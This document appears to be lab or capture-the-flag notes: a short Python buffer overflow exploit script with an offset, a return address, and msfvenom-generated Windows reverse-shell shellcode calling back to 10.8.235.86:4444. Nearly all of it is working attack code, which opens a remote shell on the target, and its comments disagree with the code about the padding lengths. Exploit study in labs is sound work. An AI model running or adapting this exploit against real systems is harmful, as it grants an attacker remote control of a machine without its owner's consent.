offset : 514

ESP1 0028F930
badchars 1 :


CREATED SHELLCODE:

#!/usr/bin/env python

  

# Skeleton Buffer Overflow script

# usage python brain.py <targetIP> <targetPort>

  

import socket

import sys

  

rhost = sys.argv[1]

rport = int(sys.argv[2])

  

# uname = "yavuz"

  

# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.235.86 LPORT=4444 -f c -b "\x00"

shellcode = (

"\xdb\xd8\xbf\xc8\xd2\x76\x8f\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"

"\x52\x31\x7d\x17\x83\xed\xfc\x03\xb5\xc1\x94\x7a\xb9\x0e\xda"

"\x85\x41\xcf\xbb\x0c\xa4\xfe\xfb\x6b\xad\x51\xcc\xf8\xe3\x5d"

"\xa7\xad\x17\xd5\xc5\x79\x18\x5e\x63\x5c\x17\x5f\xd8\x9c\x36"

"\xe3\x23\xf1\x98\xda\xeb\x04\xd9\x1b\x11\xe4\x8b\xf4\x5d\x5b"

"\x3b\x70\x2b\x60\xb0\xca\xbd\xe0\x25\x9a\xbc\xc1\xf8\x90\xe6"

"\xc1\xfb\x75\x93\x4b\xe3\x9a\x9e\x02\x98\x69\x54\x95\x48\xa0"

"\x95\x3a\xb5\x0c\x64\x42\xf2\xab\x97\x31\x0a\xc8\x2a\x42\xc9"

"\xb2\xf0\xc7\xc9\x15\x72\x7f\x35\xa7\x57\xe6\xbe\xab\x1c\x6c"

"\x98\xaf\xa3\xa1\x93\xd4\x28\x44\x73\x5d\x6a\x63\x57\x05\x28"

"\x0a\xce\xe3\x9f\x33\x10\x4c\x7f\x96\x5b\x61\x94\xab\x06\xee"

"\x59\x86\xb8\xee\xf5\x91\xcb\xdc\x5a\x0a\x43\x6d\x12\x94\x94"

"\x92\x09\x60\x0a\x6d\xb2\x91\x03\xaa\xe6\xc1\x3b\x1b\x87\x89"

"\xbb\xa4\x52\x1d\xeb\x0a\x0d\xde\x5b\xeb\xfd\xb6\xb1\xe4\x22"

"\xa6\xba\x2e\x4b\x4d\x41\xb9\x7e\x9a\xa2\x6f\x17\x98\x34\x81"

"\xbb\x15\xd2\xcb\x53\x70\x4d\x64\xcd\xd9\x05\x15\x12\xf4\x60"

"\x15\x98\xfb\x95\xd8\x69\x71\x85\x8d\x99\xcc\xf7\x18\xa5\xfa"

"\x9f\xc7\x34\x61\x5f\x81\x24\x3e\x08\xc6\x9b\x37\xdc\xfa\x82"

"\xe1\xc2\x06\x52\xc9\x46\xdd\xa7\xd4\x47\x90\x9c\xf2\x57\x6c"

"\x1c\xbf\x03\x20\x4b\x69\xfd\x86\x25\xdb\x57\x51\x99\xb5\x3f"

"\x24\xd1\x05\x39\x29\x3c\xf0\xa5\x98\xe9\x45\xda\x15\x7e\x42"

"\xa3\x4b\x1e\xad\x7e\xc8\x3e\x4c\xaa\x25\xd7\xc9\x3f\x84\xba"

"\xe9\xea\xcb\xc2\x69\x1e\xb4\x30\x71\x6b\xb1\x7d\x35\x80\xcb"

"\xee\xd0\xa6\x78\x0e\xf1"

)

  
  
  

# Buffer was 2012 in this app, so 2012 times NOP, then the bad chrs, then another 20 NOP and then shellcodecomes.

payload = "\x90" * 524 + "\xf3\x12\x17\x31" + "\x90" * 16 + shellcode

  

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

c = s.connect((rhost, rport))

s.recv(1024)

s.send(payload + "\r\n")

data = s.recv(1024)

s.close()
	
	
	